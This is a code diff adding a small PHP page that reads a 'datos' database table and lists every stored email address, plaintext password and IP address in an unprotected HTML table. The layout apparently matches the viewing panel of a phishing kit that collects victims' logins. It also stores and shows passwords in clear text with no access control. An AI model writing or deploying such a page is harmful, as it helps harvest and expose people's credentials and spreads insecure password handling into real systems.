@@ -1,0 +1,62 @@
+<style>
+   
+#customers {
+  font-family: "Trebuchet MS", Arial, Helvetica, sans-serif;
+  border-collapse: collapse;
+  font-size: 10px;
+  width: 100%;
+}
+
+#customers td, #customers th {
+  border: 1px solid #ddd;
+  padding: 8px;
+}
+
+#customers tr:nth-child(even){background-color: #f2f2f2;}
+
+#customers tr:hover {background-color: #ddd;}
+
+#customers th {
+  padding-top: 12px;
+  padding-bottom: 12px;
+  text-align: left;
+  background-color: #4CAF50;
+  color: white;
+}
+</style>
+<html>
+    <body>
+    <div style="witdh:100%">
+    <table id="customers">
+        <tr>
+            <th>Correo</th>
+            <th>Clave</th>
+            <th>ip</th>
+        </tr>
+        <?php
+        include 'action/conexion.php';
+        $Conexion=new Conexion();
+        $Conexion->conectar();
+        $query ="select correo,clave,ip from datos";
+        $result= mysqli_query( $Conexion->conn, $query);
+       // $valor =mysqli_fetch_array($result);        
+        while($datos=mysqli_fetch_array($result)){
+            ?>
+        <tr>
+            <td><?php echo $datos['correo']?></td>
+            <td><?php echo $datos['clave']?></td>
+            <td><?php echo $datos['ip']?></td>
+            
+        </tr>
+        
+        <?php
+        
+        }
+        $Conexion->desconectar();
+        ?>
+    </table>
+        </div>
+        
+        </body>
+</html>
+
